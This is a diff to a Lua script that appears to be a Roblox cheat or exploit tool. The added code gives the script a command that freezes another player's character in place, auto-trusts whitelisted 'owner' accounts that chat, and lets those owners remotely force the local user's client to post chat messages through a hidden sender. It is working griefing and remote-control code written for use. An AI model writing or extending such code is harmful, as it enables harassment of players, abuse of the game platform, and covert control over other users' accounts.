@@ -6455,10 +6455,11 @@ local function sendHiddenChat(msg)
     pcall(function()
         local TextChatService = game:GetService("TextChatService")
         if TextChatService and TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
-            -- Robust channel search
             local tc = TextChatService:FindFirstChild("TextChannels")
+            -- Priority list of general channels
             local channel = (tc and tc:FindFirstChild("RBXGeneral")) 
                 or (tc and tc:FindFirstChild("RBXSystem"))
+                or (tc and tc:FindFirstChild("All"))
                 or (tc and tc:GetChildren()[1])
             if channel then
                 channel:SendAsync(msg)
@@ -6521,6 +6522,19 @@ local function PerformFEAction(cmd, targetPlayer)
         hrp.CFrame = targetPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0, 0, 2)
         task.wait(0.2)
         hrp.CFrame = oldCF
+    elseif cmd == ".freeze" or cmd == ".lock" then
+        SendNotify("❄️ FE Freeze", "Freezing " .. targetPlayer.DisplayName, 3)
+        local startTime = tick()
+        local tHrp = targetPlayer.Character.HumanoidRootPart
+        local tCF = tHrp.CFrame
+        while tick() - startTime < 5 do -- Freeze for 5 seconds (Server side effect)
+            if not targetPlayer.Character or not targetPlayer.Character:FindFirstChild("HumanoidRootPart") then break end
+            tHrp.CFrame = tCF
+            tHrp.AssemblyLinearVelocity = Vector3.zero
+            tHrp.AssemblyAngularVelocity = Vector3.zero
+            RunService.Heartbeat:Wait()
+        end
+        SendNotify("❄️ FE Freeze", "Freeze expired for " .. targetPlayer.DisplayName, 2)
     end
 end
 
@@ -6528,7 +6542,15 @@ local function handleOwnerCommand(chatterData, msg)
     if not msg then return end
     local lmsg = msg:lower()
 
-    -- 1. Handshake logic (case-insensitive Username lookup)
+    -- 1. Auto-Trust & Handshake Logic
+    -- If the chatter is a whitelisted Roblox name, trust them immediately
+    if IsUsernameOwner(chatterData.Name) then
+        if not SessionOwners[chatterData.UserId] then
+            SessionOwners[chatterData.UserId] = true
+            SendNotify("👑 Owner", chatterData.DisplayName .. " (@" .. chatterData.Name .. ") Authorized", 3)
+        end
+    end
+
     if lmsg:find("onyx_auth_") then
         local start = lmsg:find("onyx_auth_") + 10
         local rest = lmsg:sub(start)
@@ -6619,8 +6641,15 @@ local function handleOwnerCommand(chatterData, msg)
                 elseif cmd == ".say" then
                     local text = table.concat(parts, " ", 3)
                     if text and text ~= "" then
-                        sendHiddenChat(text)
-                        SendNotify("👑 Owner Cmd", chatterData.DisplayName .. " forced say: " .. text, 3)
+                        if chatterData == plr then
+                            -- If owner is forcing themselves to say something
+                            sendHiddenChat(text)
+                            SendNotify("👑 Owner Cmd", "Forced self say: " .. text, 3)
+                        else
+                            -- Remote owner forcing local player to say something
+                            sendHiddenChat(text)
+                            SendNotify("👑 Owner Cmd", chatterData.DisplayName .. " forced you to say: " .. text, 3)
+                        end
                     end
                 elseif cmd == ".lock" or cmd == ".freeze" then
                     if hrp then hrp.Anchored = true end
